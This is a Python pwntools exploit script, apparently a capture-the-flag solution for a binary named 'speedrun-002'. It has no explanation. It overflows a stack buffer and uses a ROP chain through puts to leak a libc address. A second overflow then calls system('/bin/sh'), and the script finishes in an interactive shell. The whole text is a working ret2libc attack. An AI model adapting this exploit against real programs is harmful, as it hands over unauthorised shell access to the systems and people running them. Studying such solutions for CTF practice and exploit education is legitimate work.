#!/usr/bin/env python
# coding=utf-8
from pwn import *
a=process("./speedrun-002")
elf=ELF("./speedrun-002")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def init():
    a.recvuntil("What say you now?\n")
    a.send("Everything intelligent is so boring.")
    a.recvuntil("What an interesting thing to say.\nTell me more.\n")

init()
puts_plt=elf.plt["puts"]
pop_rdi_ret=0x4008a3
puts_got=elf.got["puts"]
start_addr=0x000000000400600

payload='A'*0x408
payload+=p64(pop_rdi_ret)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(start_addr)

a.send(payload)

a.recvuntil("Fascinating.\n")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["puts"]
success("libc_base ==> 0x%x"%libc_base)

init()
payload='A'*0x408
payload+=p64(pop_rdi_ret)
payload+=p64(libc_base+next(libc.search("/bin/sh")))
payload+=p64(libc_base+libc.symbols["system"])
a.send(payload)
a.interactive()

